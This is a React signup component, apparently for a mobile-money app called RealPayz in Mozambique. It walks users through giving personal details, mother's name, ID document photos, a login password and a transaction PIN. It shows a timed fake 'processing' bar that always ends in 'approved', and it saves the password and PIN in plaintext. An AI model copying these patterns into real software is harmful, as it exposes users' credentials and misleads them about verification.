'use client'

import { useEffect, useMemo, useState } from 'react'
import Image from 'next/image'
import { ArrowRight, Camera, CheckCircle2, FileText, Lock, ShieldCheck, Sparkles } from 'lucide-react'
import {
  StepShell,
  UnderlineInput,
  ArrowButton,
  PrimaryButton,
  OptionRow,
  PinField,
} from './ui'
import { DocumentCapture } from './document-capture'
import {
  PROVINCES,
  LEAD_REASONS,
  OCCUPATIONS,
  DOCUMENT_TYPES,
  MOBILE_WALLETS,
  formatMozPhone,
  isValidMozPhone,
  isValidEmail,
  formatBirthDate,
  isValidBirthDate,
  formatCurrencyInput,
  currencyInputToNumber,
  capitalizeWords,
  firstName,
} from '@/lib/onboarding-format'
import { registerUserAndLinkPush } from '@/lib/register-user'
import { saveStoredUser, type StoredUser } from '@/lib/stored-user'
import { showInstallPrompt } from '@/components/install-prompt'

const STEPS = [
  'phone',
  'email',
  'name',
  'leadConfirm',
  'reasons',
  'processing',
  'approved',
  'pin6',
  'birth',
  'mother',
  'province',
  'income',
  'occupation',
  'docType',
  'docInstructions',
  'docFront',
  'docBack',
  'accountOpen',
  'txPin',
  'wallets',
] as const

type Step = (typeof STEPS)[number]

// Telas em que não faz sentido voltar (processos já concluídos).
const NO_BACK: Step[] = ['processing', 'approved', 'pin6', 'accountOpen', 'txPin', 'wallets']

interface SignupFlowProps {
  onExit: () => void
  onComplete: (user: StoredUser) => void
}

export function SignupFlow({ onExit, onComplete }: SignupFlowProps) {
  const [index, setIndex] = useState(0)
  const [direction, setDirection] = useState<'forward' | 'backward'>('forward')

  const [phone, setPhone] = useState('')
  const [email, setEmail] = useState('')
  const [name, setName] = useState('')
  const [reasons, setReasons] = useState<string[]>([])
  const [pin6, setPin6] = useState('')
  const [birthDate, setBirthDate] = useState('')
  const [motherName, setMotherName] = useState('')
  const [province, setProvince] = useState('')
  const [incomeInput, setIncomeInput] = useState('')
  const [occupation, setOccupation] = useState<string>(OCCUPATIONS[0])
  const [documentType, setDocumentType] = useState<string>(DOCUMENT_TYPES[0].id)
  const [txPin, setTxPin] = useState('')
  const [txPinConfirm, setTxPinConfirm] = useState('')
  const [wallets, setWallets] = useState<string[]>(MOBILE_WALLETS.map((w) => w.id))

  const [progress, setProgress] = useState(0)

  const step = STEPS[index]
  const phoneDigits = phone.replace(/\D/g, '')
  const userFirstName = useMemo(() => capitalizeWords(firstName(name)), [name])

  const go = (delta: 1 | -1) => {
    setDirection(delta === 1 ? 'forward' : 'backward')
    setIndex((i) => Math.min(Math.max(i + delta, 0), STEPS.length - 1))
  }
  const next = () => go(1)
  const back = () => (index === 0 ? onExit() : go(-1))
  const canGoBack = !NO_BACK.includes(step)

  // TELA 7: barra de 0 a 100% enquanto o usuário é criado no servidor
  // (isso dispara a notificação "conta aprovada" para quem permitiu push).
  useEffect(() => {
    if (step !== 'processing') return
    let cancelled = false
    setProgress(0)

    const startedAt = Date.now()
    const duration = 4200
    const tick = window.setInterval(() => {
      const pct = Math.min(99, Math.round(((Date.now() - startedAt) / duration) * 100))
      setProgress(pct)
    }, 60)

    const params = new URLSearchParams(window.location.search)
    const isVip = params.get('acesso') === 'vip' || params.get('plano') === 'vip'

    Promise.all([
      registerUserAndLinkPush({
        name: capitalizeWords(name.trim()),
        phone: phoneDigits,
        accessType: isVip ? 'VIP' : 'FREE',
        newAccount: true,
      }),
      new Promise((r) => setTimeout(r, duration)),
    ]).then(() => {
      if (cancelled) return
      window.clearInterval(tick)
      setProgress(100)
      window.setTimeout(() => {
        if (!cancelled) {
          setDirection('forward')
          setIndex(STEPS.indexOf('approved'))
        }
      }, 500)
    })

    return () => {
      cancelled = true
      window.clearInterval(tick)
    }
  }, [step, name, phoneDigits])

  const trackLead = () => {
    const fbq = (window as unknown as { fbq?: (...args: unknown[]) => void }).fbq
    fbq?.('track', 'Lead', { content_name: 'Cadastro RealPayz', status: 'Iniciado' })
  }

  const finish = () => {
    const user: StoredUser = {
      name: capitalizeWords(name.trim()),
      phone: phoneDigits,
      email: email.trim(),
      password: pin6,
      transactionPin: txPin,
      birthDate,
      motherName: capitalizeWords(motherName.trim()),
      province,
      monthlyIncome: currencyInputToNumber(incomeInput),
      occupation,
      documentType,
      wallets,
      reasons,
      balance: 0,
      income: 0,
      keys: [],
      transactions: [],
    }
    saveStoredUser(user)
    showInstallPrompt()
    onComplete(user)
  }

  const toggle = (list: string[], value: string) =>
    list.includes(value) ? list.filter((v) => v !== value) : [...list, value]

  const submit = (valid: boolean) => (e: React.FormEvent) => {
    e.preventDefault()
    if (valid) next()
  }

  switch (step) {
    case 'phone': {
      const valid = isValidMozPhone(phoneDigits)
      return (
        <form onSubmit={submit(valid)} className="contents">
          <StepShell
            stepKey={step}
            direction={direction}
            onBack={back}
            title="Qual é o seu número de celular?"
            subtitle="Vamos usar este número para proteger a sua conta e enviar avisos importantes."
            footer={<ArrowButton disabled={!valid} />}
          >
            <div className="flex items-end gap-3">
              <span className="border-b-2 border-border py-3 text-2xl font-semibold text-muted-foreground">+258</span>
              <UnderlineInput
                autoFocus
                type="tel"
                inputMode="numeric"
                autoComplete="tel-national"
                placeholder="84 000 0000"
                aria-label="Número de celular"
                value={formatMozPhone(phone)}
                onChange={(e) => setPhone(e.target.value)}
              />
            </div>
          </StepShell>
        </form>
      )
    }

    case 'email': {
      const valid = isValidEmail(email)
      return (
        <form onSubmit={submit(valid)} className="contents">
          <StepShell
            stepKey={step}
            direction={direction}
            onBack={back}
            title="Qual é o seu e-mail?"
            subtitle="Ele será usado para avisar sobre transações e novidades da conta."
            footer={<ArrowButton disabled={!valid} />}
          >
            <UnderlineInput
              autoFocus
              type="email"
              inputMode="email"
              autoComplete="email"
              autoCapitalize="none"
              placeholder="voce@exemplo.com"
              aria-label="E-mail"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </StepShell>
        </form>
      )
    }

    case 'name': {
      const valid = name.trim().split(/\s+/).length >= 2
      return (
        <form onSubmit={submit(valid)} className="contents">
          <StepShell
            stepKey={step}
            direction={direction}
            onBack={back}
            title="Qual é o seu nome completo?"
            subtitle="Escreva como aparece no seu documento de identificação."
            footer={<ArrowButton disabled={!valid} />}
          >
            <UnderlineInput
              autoFocus
              type="text"
              autoComplete="name"
              autoCapitalize="words"
              placeholder="Nome e apelido"
              aria-label="Nome completo"
              value={name}
              onChange={(e) => setName(e.target.value)}
            />
          </StepShell>
        </form>
      )
    }

    case 'leadConfirm':
      return (
        <StepShell
          stepKey={step}
          direction={direction}
          onBack={back}
          title="Falta pouco para finalizar a criação da sua conta!"
          subtitle={
            <>
              Ao aceitar, declaro que li e estou ciente das condições de tratamento dos meus dados pessoais,
              conforme a <span className="font-semibold text-primary">Política de Privacidade</span>.
            </>
          }
          footer={
            <PrimaryButton
              onClick={() => {
                trackLead()
                next()
              }}
            >
              Aceitar
            </PrimaryButton>
          }
        >
          <div className="flex justify-center py-6">
            <div className="relative flex h-40 w-40 items-center justify-center">
              <span className="absolute inset-0 rounded-full bg-accent" />
              <span className="absolute inset-4 rounded-full border-4 border-primary/20" />
              <span className="absolute inset-4 rounded-full border-4 border-transparent border-t-primary" />
              <FileText className="relative h-14 w-14 text-primary" strokeWidth={1.5} />
            </div>
          </div>
        </StepShell>
      )

    case 'reasons': {
      const valid = reasons.length > 0
      return (
        <StepShell
          stepKey={step}
          direction={direction}
          onBack={back}
          title="Nos conte, o que te trouxe aqui?"
          subtitle="Pode escolher mais de uma opção."
          footer={<ArrowButton disabled={!valid} onClick={next} />}
        >
          <div className="flex flex-col gap-3" role="group" aria-label="Motivos">
            {LEAD_REASONS.map((reason) => (
              <OptionRow
                key={reason}
                multiple
                selected={reasons.includes(reason)}
                onSelect={() => setReasons((r) => toggle(r, reason))}
              >
                {reason}
              </OptionRow>
            ))}
          </div>
        </StepShell>
      )
    }

    case 'processing':
      return (
        <div
          key={step}
          className="mx-auto flex min-h-dvh w-full max-w-md flex-col items-center justify-center gap-10 bg-background px-8 text-center animate-fade-in"
        >
          <div className="flex flex-col gap-2">
            <p className="text-2xl font-bold text-foreground">Enviando seus dados...</p>
            <p className="text-muted-foreground">Estamos preparando a sua conta RealPayz.</p>
          </div>
          <div className="flex w-full flex-col gap-3">
            <div className="h-3 w-full overflow-hidden rounded-full bg-muted" role="progressbar" aria-valuenow={progress} aria-valuemin={0} aria-valuemax={100}>
              <div className="h-full rounded-full bg-brand-gradient transition-[width] duration-100 ease-linear" style={{ width: `${progress}%` }} />
            </div>
            <p className="text-right text-sm font-semibold tabular-nums text-primary">{progress}%</p>
          </div>
        </div>
      )

    case 'approved':
      return (
        <div key={step} className="relative mx-auto flex min-h-dvh w-full max-w-md flex-col overflow-hidden bg-background animate-step-forward">
          <div className="absolute inset-x-0 top-0 h-[62%] bg-brand-gradient opacity-95" />
          <div className="absolute inset-x-0 top-[52%] h-[12%] bg-gradient-to-b from-transparent to-background" />
          <div className="relative flex flex-1 flex-col items-center justify-end px-6 pt-12">
            <div className="w-[72%] max-w-xs overflow-hidden rounded-[32px] shadow-2xl shadow-primary-deep/50 ring-4 ring-primary-foreground/25 animate-pop-in">
              <Image
                src="/images/approved-phone.png"
                alt="Smartphone mostrando o app RealPayz com saldo"
                width={360}
                height={360}
                priority
                className="aspect-square w-full object-cover"
              />
            </div>
          </div>
          <div className="relative flex flex-col gap-6 px-6 pb-10 pt-6 text-center">
            <div className="flex flex-col gap-3">
              <span className="mx-auto flex items-center gap-2 rounded-full bg-success/10 px-4 py-1.5 text-sm font-semibold text-success">
                <CheckCircle2 className="h-4 w-4" /> Cadastro aprovado
              </span>
              <h1 className="text-balance text-3xl font-bold leading-tight text-foreground">
                Bem-vindo à sua Conta RealPayz, {userFirstName}.
              </h1>
              <p className="text-pretty text-muted-foreground">
                Agora vamos configurar a segurança e concluir a verificação da sua identidade.
              </p>
            </div>
            <PrimaryButton onClick={next}>
              Continuar cadastro <ArrowRight className="h-5 w-5" />
            </PrimaryButton>
          </div>
        </div>
      )

    case 'pin6': {
      const valid = pin6.length === 6
      return (
        <form onSubmit={submit(valid)} className="contents">
          <StepShell
            stepKey={step}
            direction={direction}
            title="Crie uma senha de 6 dígitos para entrar no app."
            subtitle="Evite sequências óbvias como 123456 ou a sua data de nascimento."
            footer={<PrimaryButton type="submit" disabled={!valid}>Confirmar senha</PrimaryButton>}
          >
            <PinField length={6} autoFocus value={pin6} onChange={setPin6} label="Senha de 6 dígitos" />
          </StepShell>
        </form>
      )
    }

    case 'birth': {
      const valid = isValidBirthDate(birthDate)
      return (
        <form onSubmit={submit(valid)} className="contents">
          <StepShell
            stepKey={step}
            direction={direction}
            onBack={back}
            title="Qual é a sua data de nascimento?"
            subtitle="Digite apenas os números. As barras entram sozinhas."
            footer={<ArrowButton disabled={!valid} />}
          >
            <UnderlineInput
              autoFocus
              type="text"
              inputMode="numeric"
              autoComplete="bday"
              placeholder="DD/MM/AAAA"
              aria-label="Data de nascimento"
              value={birthDate}
              onChange={(e) => setBirthDate(formatBirthDate(e.target.value))}
            />
          </StepShell>
        </form>
      )
    }

    case 'mother': {
      const valid = motherName.trim().split(/\s+/).length >= 2
      return (
        <form onSubmit={submit(valid)} className="contents">
          <StepShell
            stepKey={step}
            direction={direction}
            onBack={back}
            title="Qual é o nome completo da sua mãe?"
            subtitle="Usamos esta informação para confirmar a sua identidade."
            footer={<ArrowButton disabled={!valid} />}
          >
            <UnderlineInput
              autoFocus
              type="text"
              autoCapitalize="words"
              placeholder="Nome completo da mãe"
              aria-label="Nome da mãe"
              value={motherName}
              onChange={(e) => setMotherName(e.target.value)}
            />
          </StepShell>
        </form>
      )
    }

    case 'province':
      return (
        <StepShell
          stepKey={step}
          direction={direction}
          onBack={back}
          title="Qual é a sua província?"
          subtitle="Toque na província onde você mora."
        >
          <ul className="-mx-2 flex flex-col" role="listbox" aria-label="Províncias">
            {PROVINCES.map((item) => (
              <li key={item}>
                <button
                  type="button"
                  role="option"
                  aria-selected={province === item}
                  onClick={() => {
                    setProvince(item)
                    next()
                  }}
                  className="flex w-full items-center justify-between rounded-2xl px-4 py-4 text-left text-lg font-medium text-foreground transition-colors hover:bg-accent active:bg-accent"
                >
                  {item}
                  <ArrowRight className="h-5 w-5 text-muted-foreground" />
                </button>
              </li>
            ))}
          </ul>
        </StepShell>
      )

    case 'income': {
      const valid = currencyInputToNumber(incomeInput) > 0
      return (
        <form onSubmit={submit(valid)} className="contents">
          <StepShell
            stepKey={step}
            direction={direction}
            onBack={back}
            title="Qual é a sua renda média mensal?"
            footer={
              <>
                <p className="text-pretty text-sm leading-relaxed text-muted-foreground">
                  Esse valor inclui seu salário, suas atividades digitais e outras rendas.
                </p>
                <ArrowButton disabled={!valid} />
              </>
            }
          >
            <div className="flex items-end gap-3">
              <span className="border-b-2 border-border py-3 text-2xl font-semibold text-muted-foreground">MT</span>
              <UnderlineInput
                autoFocus
                type="text"
                inputMode="numeric"
                placeholder="0,00"
                aria-label="Renda mensal em meticais"
                value={incomeInput}
                onChange={(e) => setIncomeInput(formatCurrencyInput(e.target.value))}
              />
            </div>
          </StepShell>
        </form>
      )
    }

    case 'occupation':
      return (
        <StepShell
          stepKey={step}
          direction={direction}
          onBack={back}
          title="Qual é a sua ocupação atual?"
          footer={<PrimaryButton onClick={next}>Continuar</PrimaryButton>}
        >
          <div className="flex flex-col gap-3" role="radiogroup" aria-label="Ocupação">
            {OCCUPATIONS.map((item) => (
              <OptionRow key={item} selected={occupation === item} onSelect={() => setOccupation(item)}>
                {item}
              </OptionRow>
            ))}
          </div>
        </StepShell>
      )

    case 'docType':
      return (
        <StepShell
          stepKey={step}
          direction={direction}
          onBack={back}
          title={
            <>
              Olá, {userFirstName}! Para garantir que ninguém se passe por você, precisamos verificar a sua
              identidade.
            </>
          }
          subtitle="Escolha o documento que você tem em mãos."
          footer={<PrimaryButton onClick={next}>Continuar</PrimaryButton>}
        >
          <div className="flex flex-col gap-3" role="radiogroup" aria-label="Tipo de documento">
            {DOCUMENT_TYPES.map((doc) => (
              <OptionRow
                key={doc.id}
                selected={documentType === doc.id}
                onSelect={() => setDocumentType(doc.id)}
                badge={doc.recommended ? 'Recomendado' : undefined}
              >
                {doc.label}
              </OptionRow>
            ))}
          </div>
        </StepShell>
      )

    case 'docInstructions':
      return (
        <StepShell
          stepKey={step}
          direction={direction}
          onBack={back}
          tone="dark"
          title={
            <>
              Para continuar, prepare <span className="text-primary-light">o seu documento original</span> com foto.
            </>
          }
          footer={
            <PrimaryButton onClick={next}>
              <Camera className="h-5 w-5" /> Preparar câmera
            </PrimaryButton>
          }
        >
          <ul className="flex flex-col gap-5 text-lg leading-relaxed text-background/80">
            <li>
              <span className="font-semibold text-background">Use somente o documento original.</span> Cópias,
              impressões e fotos da tela não são aceitas.
            </li>
            <li>
              <span className="font-semibold text-background">Não abra o documento.</span> Deixe para cima o lado
              que tem a foto.
            </li>
            <li>
              Limpe a lente da câmera para{' '}
              <span className="font-semibold text-background">evitar fotos embaçadas ou borradas.</span>
            </li>
            <li>
              Procure um <span className="font-semibold text-background">lugar bem iluminado</span> e evite reflexos.
            </li>
          </ul>
        </StepShell>
      )

    case 'docFront':
      return (
        <StepShell stepKey={step} direction={direction} onBack={back} tone="dark" title="Frente do documento">
          <DocumentCapture key="frente" side="frente" onConfirm={next} />
        </StepShell>
      )

    case 'docBack':
      return (
        <StepShell stepKey={step} direction={direction} onBack={back} tone="dark" title="Verso do documento">
          <DocumentCapture key="verso" side="verso" onConfirm={next} />
        </StepShell>
      )

    case 'accountOpen':
      return (
        <StepShell
          stepKey={step}
          direction={direction}
          title={<>Sua conta foi aberta com sucesso, {userFirstName}!</>}
          subtitle="Agora você pode aproveitar o Pix internacional, fazer saques e depósitos na sua carteira móvel."
          footer={
            <PrimaryButton onClick={next}>
              Continuar <ArrowRight className="h-5 w-5" />
            </PrimaryButton>
          }
        >
          <div className="flex justify-center py-6">
            <div className="flex h-32 w-32 items-center justify-center rounded-full bg-brand-gradient shadow-2xl shadow-primary/40 animate-pop-in">
              <Sparkles className="h-14 w-14 text-primary-foreground" />
            </div>
          </div>
        </StepShell>
      )

    case 'txPin': {
      const match = txPin.length === 4 && txPin === txPinConfirm
      const mismatch = txPinConfirm.length === 4 && txPin !== txPinConfirm
      return (
        <form onSubmit={submit(match)} className="contents">
          <StepShell
            stepKey={step}
            direction={direction}
            title="Crie uma senha de 4 dígitos para autorizar saques e movimentações."
            subtitle="Ela é diferente da senha de acesso ao app."
            footer={<PrimaryButton type="submit" disabled={!match}>Confirmar</PrimaryButton>}
          >
            <div className="flex flex-col gap-8">
              <div className="flex flex-col gap-3">
                <span className="text-sm font-medium text-muted-foreground">Senha de transação</span>
                <PinField length={4} autoFocus value={txPin} onChange={setTxPin} label="Senha de transação" />
              </div>
              <div className="flex flex-col gap-3">
                <span className="text-sm font-medium text-muted-foreground">Confirme a senha</span>
                <PinField
                  length={4}
                  value={txPinConfirm}
                  onChange={setTxPinConfirm}
                  label="Confirmação da senha de transação"
                  error={mismatch}
                />
              </div>
              <div className="min-h-12">
                {match ? (
                  <p className="flex items-center gap-2 font-semibold text-success animate-pop-in">
                    <CheckCircle2 className="h-5 w-5" /> Senha criada com sucesso!
                  </p>
                ) : mismatch ? (
                  <p className="flex items-center gap-2 font-medium text-destructive">
                    <Lock className="h-5 w-5" /> As senhas não coincidem.
                  </p>
                ) : null}
              </div>
            </div>
          </StepShell>
        </form>
      )
    }

    case 'wallets':
      return (
        <StepShell
          stepKey={step}
          direction={direction}
          title="Encontramos estas carteiras móveis disponíveis no seu país."
          subtitle="Selecione as que deseja utilizar para depósitos e saques."
          footer={
            <PrimaryButton onClick={finish} disabled={wallets.length === 0}>
              <ShieldCheck className="h-5 w-5" />
              {wallets.length === MOBILE_WALLETS.length ? 'Usar todas e continuar' : 'Continuar'}
            </PrimaryButton>
          }
        >
          <div className="flex flex-col gap-3" role="group" aria-label="Carteiras móveis">
            {MOBILE_WALLETS.map((wallet) => (
              <OptionRow
                key={wallet.id}
                multiple
                selected={wallets.includes(wallet.id)}
                onSelect={() => setWallets((w) => toggle(w, wallet.id))}
                badge={wallet.operator}
                leading={
                  <Image
                    src={wallet.logo}
                    alt={`Logo ${wallet.name}`}
                    width={48}
                    height={48}
                    className="h-12 w-12 rounded-xl object-cover"
                  />
                }
              >
                {wallet.name}
              </OptionRow>
            ))}
          </div>
        </StepShell>
      )
  }
}
